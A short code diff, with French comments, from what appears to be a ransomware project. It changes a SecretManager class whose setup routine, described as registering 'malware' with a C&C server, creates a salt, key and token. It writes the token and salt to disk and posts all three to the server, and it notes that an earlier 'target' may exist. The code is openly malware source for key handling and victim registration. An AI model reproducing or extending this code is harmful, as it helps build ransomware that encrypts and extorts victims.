@@ -49,7 +49,7 @@ class SecretManager:
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
 
-        salt,key,token=self.create()#creation données cryptographiques
+        self._salt,self._key,self._token=self.create()#creation données cryptographiques
 
         #on créer le repertoire de stockage en local
         dir_path= os.path.join(self._path, 'token')#on se place au /root/token
@@ -59,14 +59,14 @@ class SecretManager:
         path = os.path.join(self._path,'token.bin')
         if os.path.exists(path)==False:#on vérifie qu'il n'y est pas deja un fichier token.bin 
             with open(path, "wb") as f:
-                f.write(token)
+                f.write(self._token)
 
             #sauvegarde du salt dans salt.bin
             path = os.path.join(self._path,'salt.bin')
             with open(path, "wb") as f:
-                f.write(salt)
+                f.write(self._salt)
 
-            self.post_new(salt,key,token)
+            self.post_new(self._salt,self._key,self._token)
         else:
             print("Un fichier token.bin existe déja, surement une précedente cible ;)")
 
